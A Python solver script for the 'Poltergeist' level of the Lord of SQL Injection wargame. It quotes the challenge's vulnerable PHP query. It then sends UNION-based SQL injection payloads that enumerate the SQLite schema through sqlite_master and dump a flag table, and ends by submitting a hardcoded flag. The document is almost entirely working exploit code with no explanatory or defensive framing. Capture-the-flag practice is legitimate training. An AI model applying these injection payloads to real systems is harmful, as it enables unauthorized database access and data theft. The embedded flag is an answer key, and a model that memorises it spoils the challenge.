#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'Hello guest' in args[0]


def main():
    '''
    Poltergeist 40

    $query = "select id from member where id='admin' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlite_fetch_array(sqlite_query($db,$query));
    if($result['id']) echo "<h2>Hello {$result['id']}</h2>";

    if($poltergeistFlag === $_GET['pw']) solve("poltergeist");
    // Flag is in `flag_{$hash}` table, not in `member` table. 
    //Let's look over whole of the database.
    highlight_file(__FILE__);
    '''

    url = "https://los.rubiya.kr/chall/poltergeist_a62c7abc7e6ce0080dbf0e14a07d1f1d.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "' union select sql from sqlite_master order by 1 desc--"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    response = p.my_request()
    print('')

    p.payload = "' union select * from flag_70c81d99--"
    response = p.my_request()
    print('')

    p.payload = 'FLAG{ea5d3bbdcc4aec9abe4a6a9f66eaaa13}'
    response = p.my_request()
    if 'Clear!' in response:
        print('\nPoltergeist Clear!')


if __name__ == '__main__':
    main()
